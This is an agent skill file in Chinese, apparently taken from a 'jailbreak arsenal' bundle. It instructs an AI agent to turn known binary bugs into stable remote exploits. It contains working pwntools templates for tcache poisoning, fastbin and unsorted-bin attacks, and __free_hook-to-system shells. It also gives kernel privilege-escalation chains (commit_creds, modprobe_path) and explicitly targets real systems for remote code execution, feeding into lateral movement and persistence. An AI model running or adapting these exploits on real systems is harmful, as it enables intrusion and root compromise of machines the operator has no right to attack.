---
name: pwn-chain
description: 从逆向走到可用利用 (Working Exploit) 的全链路工程化方法。 适用场景：拿到了二进制 + 漏洞点 + 目标环境，需要写出一个能稳定打通的 exploit（不是只能本地复现一下、远程一打就崩的脚本）。 覆盖三大方向：栈溢出 / 堆利用 / 内核 pwn。强调"CTF 本地通 → 真实远程稳定打通"的工程差距：libc 版本错配、堆喷射时序、SMEP/SMAP/KASLR、栈对齐、远程
whenToUse: 从逆向走到可用利用 (Working Exploit) 的全链路工程化方法
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---

## 适用范围

当任务属于以下场景时使用本 skill：

1. **拿到二进制 + 已知漏洞点** — 静态/审计/fuzz 已经找到溢出/UAF/double free，需要从触发到拿 shell
2. **CTF 题已经本地通了，远程打不通** — 远端环境差异导致脚本失效，需要稳定化
3. **真实目标的二进制利用** — SRC / 红队场景下，已经识别到内存损坏漏洞，需要构造 RCE
4. **Linux 内核驱动的 ioctl bug** — 用户态触发，目标是提权到 root

**前提**：你已经知道"哪里炸了"。本 skill 不负责发现漏洞（那是 fuzzing / 审计），只负责"从漏洞点写出 exploit"。

### 与其他 skill 的分工

| 场景 | 用什么 |
|------|--------|
| 识别 custom VM / anti-debug / 复杂 obfuscation | `reverse-engineering/` |
| 从零打开二进制做静态分析 | `ida-reverse/` 或 `radare2/` |
| **有漏洞点，写 exploit 打通远程** | **本 skill** |
| 把 pwn 拿到的 shell 整合进完整攻击链 | `attack-chain/`（下游） |

`reverse-engineering/` 关注"理解程序在干什么"（模式识别、协议还原、解 CTF 题里的奇怪机制）；本 skill 关注"把已经看懂的漏洞变成可执行的攻击"。两者经常配套使用，但分工清晰。

## 核心工作流

```text
Step 1: 确认漏洞类型 + 保护机制
   ├─ checksec ./vuln（NX / Canary / PIE / RELRO / Fortify）
   ├─ file ./vuln  + readelf -d ./vuln
   ├─ 漏洞分类：栈溢出 / 格式化字符串 / 堆 (UAF/DF/OF) / 整数 / 竞态 / 内核
   └─ → 决定走哪个 references/

Step 2: 选择利用策略
   ├─ NX 关 + 无 ASLR → 直接 shellcode
   ├─ NX 开 + 给 libc → ret2libc / one_gadget
   ├─ NX 开 + 不给 libc → leak 后 libc-database 反查
   ├─ 堆 → 按 glibc 版本对应技术 (tcache/fastbin/unsorted/large)
   └─ 内核 → commit_creds / modprobe_path / core_pattern

Step 3: 准备 libc + gadget
   ├─ libc-database：./find puts 0x6f0
   ├─ ROPgadget --binary ./libc.so.6 --only "pop|ret"
   ├─ one_gadget ./libc.so.6
   └─ 计算 base：leak_addr - libc.sym['puts']

Step 4: 写 pwntools 模板（本地 process）
   ├─ context.binary = ELF('./vuln')
   ├─ p = process('./vuln')  /  p = gdb.debug('./vuln','b *main+xx')
   ├─ payload = cyclic(N) + p64(ret) + ...
   └─ p.interactive()

Step 5: 本地通
   ├─ 反复 attach + 看寄存器 + 调 offset
   ├─ 用 pwndbg/GEF 的 vmmap / heap / bins / telescope
   └─ 跑通后切 remote()

Step 6: 远程稳定化
   ├─ libc 偏移：用 leak 反查 libc-database，不要拍脑袋
   ├─ 栈对齐：16-byte 不对齐 → movaps 崩 → 加一个 ret gadget
   ├─ 远程网络延迟 → recvuntil 精确锚字符串，禁用模糊 sleep
   ├─ 远程缓冲：sendlineafter 比 sendline 更稳
   ├─ 堆喷成功率：放大 spray 数量 + 留 padding chunk 防合并
   └─ 多次跑：写 while True 验证成功率 ≥ 95%
```

## 典型场景

### 场景 1：远程 64 位二进制 (NX+PIE+canary, 给了 libc)

```text
已有：./vuln（64-bit ELF, NX, PIE, canary）+ ./libc.so.6 + nc host port
漏洞：read(buf, 0x200) 但 buf 只有 0x40 字节 → 栈溢出
保护：canary 拦住，PIE 让 .text 随机化

策略：
1. 先 leak canary（栈/格式化字符串/部分读）
2. 再 leak 一个 libc 函数地址（puts@got）
3. 用 libc.address = leaked - libc.sym['puts'] 算 libc base
4. one_gadget ./libc.so.6 选一个约束能满足的 magic gadget
5. payload = padding + canary + saved_rbp + (pop_rdi + bin_sh + system) 或直接 one_gadget
6. 加一个 ret gadget 修栈对齐（关键！）
```

完整模板参见 `references/stack-pwn.md`。

### 场景 2：Linux 内核驱动 ioctl 越界写 → 拿 root

```text
已有：vmlinux + bzImage + initramfs.cpio.gz + 自定义 vuln.ko
漏洞：ioctl(0x1337, ptr) 里 copy_from_user 长度可控 → kernel heap overflow (kmalloc-64 slab)
保护：SMEP, SMAP, KASLR, KPTI

策略：
1. 改 init 脚本拿到 root shell（CTF）或先 leak KASLR base 再继续（真实）
2. 通过 /proc/kallsyms（可能限权）或未初始化堆喷 leak 内核基址
3. 在 kmalloc-64 slab 里喷 tty_struct / msg_msg / pipe_buffer
4. 覆盖 vtable 指针指向用户态 → 不行（SMEP），改走 stack pivot + 内核 ROP
5. ROP 链：prepare_kernel_cred(0) → commit_creds → swapgs+iretq → 用户态 execve("/bin/sh")
6. 或更省事：覆盖 modprobe_path 为 "/tmp/x"，写一个 /tmp/x，然后触发 modprobe
```

完整模板参见 `references/kernel-pwn.md`。

## 路由上下文

**上游入口**: `skills/SKILL.md`（总控）、`routing.md`
**触发条件**: 有二进制 + 已识别漏洞点，需要写 exploit

**上游 skill（先用它们再回到本 skill）**:
- 还没看懂二进制在干什么 → `reverse-engineering/`
- 需要静态详细分析 → `ida-reverse/`
- 快速侦察确认架构/保护机制 → `radare2/`

**下游 skill（拿到 shell 之后）**:
- 整合进完整攻击链（横向、提权、持久化）→ `attack-chain/`

**子模块导航**:
- 栈类利用（ret2libc / ret2csu / one_gadget / 栈对齐）→ `references/stack-pwn.md`
- 堆类利用（tcache / fastbin / unsorted / large bin / FILE struct）→ `references/heap-pwn.md`
- 内核 pwn（kROP / SMEP-SMAP 绕过 / KASLR leak / modprobe_path）→ `references/kernel-pwn.md`

## 注意事项

- **不要在本地跑通就交差** — 本地 libc / ASLR / 网络环境都和远程不同，必须在 remote 模式下连续跑 20 次以上验证稳定性
- **libc 版本必须确认** — 用 leak + libc-database 反查，不要假设是 Ubuntu 22.04 默认 libc
- **栈对齐是 64 位的常见坑** — `movaps xmm0, [rsp]` 在 rsp 未 16 字节对齐时段错误，加一个空 `ret` gadget 解决
- **堆利用对 glibc 版本极敏感** — tcache 在 2.27 引入，safe-linking 在 2.32 引入，2.34 移除 hooks，每个版本利用路径不同
- **内核 pwn 必须先确认 cpu 标志** — qemu 启动参数里有没有 +smep +smap +pku 直接决定 ROP 链怎么写
- **KASLR leak 一次就够** — 拿到一个内核地址后所有地址都算偏移，不要反复 leak

## 任务完成自检（声称完成前 MUST 通过）

- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
- [ ] 我是否基于 工具索引（本机无，以技能内「本机工具实况」为准） 使用了真实工具路径？
- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `setup` | ❌ 未装（用前先装，或改用等价工具） |
| `ida` | ❌ 未装（用前先装，或改用等价工具） |
| `radare2` | ❌ 未装（用前先装，或改用等价工具） |
| `readelf` | ❌ 未装（用前先装，或改用等价工具） |
| `binwalk` | ❌ 未装（用前先装，或改用等价工具） |

---

## 堆利用（上游深度参考）

###### 堆类利用 (Heap Pwn)

###### glibc 版本差异（必看）

堆利用的所有技术都跟 glibc 版本强绑定。先确认版本：

```bash
./libc.so.6 | head -1
###### GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

###### 或 strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc 版本 | 关键变化 | 影响 |
|-----------|---------|------|
| 2.26 及之前 | 无 tcache | unsorted/fastbin 是主战场 |
| 2.27 | **引入 tcache** | tcache poisoning 极其简单 |
| 2.29 | unsorted bin unlink 加固（chunk size 检查） | unsorted bin attack 被砍 |
| 2.31 | tcache 多重检查（key 字段） | tcache poisoning 略复杂 |
| 2.32 | **safe-linking**（fd 指针异或 PROTECT_PTR） | 需要先 leak heap base |
| 2.34 | **移除 __free_hook / __malloc_hook** | 改走 FILE struct / exit handlers |
| 2.35+ | 进一步加固 | 同 2.34，FILE 路径仍可用 |

###### tcache poisoning (2.27 - 2.31)

###### 原理

tcache 是 per-thread cache，每个 size class 一条链表，单链表（只有 fd）。
double free 检查在 2.29 之前只看链表头是不是自己，不看遍历。

###### 利用模板（2.27 - 2.31）

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

###### === Step 1: leak libc base ===
###### 申请大于 tcache 范围的 chunk（>0x408），free 进 unsorted bin，残留 main_arena 指针
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # 防止合并
for i in range(7):
    free(i)
free(7)       # 第 8 个进 unsorted bin，fd/bk 指向 main_arena+96
add(9, 0x80)  # 切回来一部分，保留 fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 偏移，glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

###### === Step 2: tcache poisoning → 写 __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
###### 用 UAF 改 chunk11 的 fd 指向 __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # 取出 chunk11
add(13, 0x30, p64(libc.sym['system']))  # 取出来的就是 __free_hook 地址，写 system

###### 触发：free 一个内容为 "/bin/sh\x00" 的 chunk
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

###### safe-linking 绕过 (2.32+)

```text
原理：tcache/fastbin 的 fd 写入时被 PROTECT_PTR 异或：
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

绕过：
1. 必须先 leak 一个堆地址（heap base）
2. 计算 obfuscated 值：fake_fd_obf = (chunk_addr >> 12) ^ target
3. 写进去
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

###### leak heap base（unsorted bin 残留 / tcache fd 残留）
heap_base = leaked_heap & ~0xfff

###### poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

###### fastbin attack (传统，2.26 及之前为主)

```text
关键点：
1. fastbin 单链表（只有 fd），无 size 检查除了 chunk size 必须匹配
2. 2.27 后 tcache 优先，fastbin 只有 tcache 满了才用
3. 仍然需要伪造一个看起来像 chunk 的内存（size 字段 = 真实 chunk size，± 一些）
```

```python
###### double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

###### 把 fd 改成 fake chunk（要求 fake_addr + 8 处的 size 字节匹配 0x70）
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # 取出 fake_addr 处的 chunk
```

###### unsorted bin attack（仅 2.28 及之前）

```text
原理：写任意地址为 main_arena+88
2.29 起加了 bck->fd == victim 的检查，绕不过
用途：覆盖 global_max_fast 让小 chunk 也走 fastbin → 配合 fastbin attack
```

```python
###### 申请 unsorted size chunk
add(0, 0x100)
add(1, 0x100)  # 防止 top consolidation
free(0)
###### UAF 改 bk 指针为 target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
```

###### large bin attack

```text
原理：large bin 比 unsorted 多一层 fd_nextsize / bk_nextsize
2.32 起也加了 chunk size 检查，但仍可用于改 global_max_fast、_IO_list_all 等
高级技巧，常用于 House of Husk 等组合拳
```

###### House of XXX 速查

| 名称 | 适用版本 | 核心思想 |
|------|---------|---------|
| House of Force | 2.28 及之前 | 改 top chunk size 为巨大值 → malloc 任意地址 |
| House of Lore | 全版本 | 伪造 small bin 链 → 返回任意地址 |
| House of Orange | 2.23-2.30 | unsorted attack 改 _IO_list_all 触发 _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit 爆破 + fastbin attack to __malloc_hook |
| House of Einherjar | 全版本 | 伪造 prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin 组合，绕过 tcache double free 检查 |
| House of Husk | 2.27+ | 改 printf 的 hook table（__printf_function_table） |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable 利用，针对无 hook 版本 |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

###### 真实利用步骤（通用 4 步）

```text
Step 1: leak heap base
  - 申请 chunk → free 到 tcache（2.32+ 保留 obfuscated fd） → show → 反推 heap
  - 或：申请大 chunk → free 到 unsorted → 切回 → show fd

Step 2: leak libc base
  - 大 chunk free 到 unsorted bin，fd/bk 残留 main_arena 地址
  - show → leak → libc.address = leak - main_arena_offset

Step 3: 控 IP
  - 2.27-2.33: tcache/fastbin poisoning → 写 __free_hook 或 __malloc_hook
  - 2.34+: FILE struct 攻击（_IO_2_1_stdout_ / stderr），改 vtable → _IO_wfile_jumps
  - 或：劫持 exit handlers（__exit_funcs / tls_dtor_list）

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

###### libc 2.34+ 没有 hook 之后的替代路径

###### FILE struct 攻击（_IO_2_1_stdout_ / _IO_2_1_stderr_）

```text
目标：当程序调用 puts/printf 时，最终走到 _IO_file_xsputn → _IO_OVERFLOW → 调用 vtable
劫持：
  1. 覆盖 _IO_2_1_stderr_ 的 vtable 指针指向伪造的 vtable
  2. 伪造 vtable，让 __overflow 字段指向 system 或 setcontext
  3. 让 fp（FILE*）本身的前 8 字节是 "/bin/sh\x00"（作为 system 的 rdi）
触发：任何 puts/printf/abort/exit 都会冲刷 stderr
```

###### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
原理：__run_exit_handlers 遍历 __exit_funcs 链表，调用每个 dtor
劫持：改链表节点的 func 指针指向 system，arg 指向 "/bin/sh"
注意：2.34+ 加了 PTR_DEMANGLE，需要 leak tls 里的 fs:[0x30] guard 值才能伪造
```

###### tls_dtor_list（更现代）

```text
__call_tls_dtors 遍历，结构类似，同样要绕过 PTR_DEMANGLE
适用：程序退出时会走，比 FILE 攻击更通用
```

###### pwndbg / GEF 堆调试命令

```text
###### pwndbg
heap              # 显示当前 arena 所有 chunk
bins              # 显示 tcache / fastbin / unsorted / small / large bins
tcache            # 单独看 tcache
find_fake_fast <addr> <size>  # 找一个能用作 fake chunk 的 fd 写入点
vis_heap_chunks   # 可视化堆布局

###### GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

###### 典型 pwntools 模板（heap menu 题）

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

###### IO 包装
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

###### === 后续根据漏洞类型选择技术栈 ===
```

###### 注意事项

- **glibc 版本是第一性问题** — 同一个二进制配 2.27 libc 和 2.34 libc，利用路径完全不同
- **tcache 容量 = 7**（每个 size class）— 喷射够 7 个才会溢出到 unsorted/fastbin
- **chunk size = 用户请求 + 0x10 头部，向 0x10 对齐**（不算 0x10 头时实际可写超出 0x8 因为下一个 chunk 的 prev_size 被复用）
- **远程堆喷不稳** — 服务端 fork 模型每次连接 brk/mmap 可能不同，要做随机化测试
- **不要在 attack 链中遗留 unsorted 残留** — main_arena 指针出现在意外的 chunk 里会让后续 show 输出错乱
- **safe-linking 错误率** — 计算 PROTECT_PTR 时记得是 `pos >> 12`，pos 是要写入的地址不是要指向的地址



<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`radare2`、`readelf`、`binwalk`
- `radare2`：`npm run toolkit:windows -- --only radare2`（官方 Windows 构建已支持）
- `readelf`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `binwalk`：`python -m pip install binwalk`（新版是 python 包）

runnability:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：4 漏洞利用｜**角色**：`exploit`
- **上游**（先做完这些再进来）：`ida-reverse`、`radare2`
- **下游**（产出交给谁）：`competition-reverse-pwn`
- **互补**（同类场景一起用）：`patch-diff-exploit`、`protocol-reverse`、`radare2`、`reverse-engineering`
- **落库**：本技能不直接产出可落库实体；产出交给下游技能记进演练台

<!-- /skill-link-graph -->
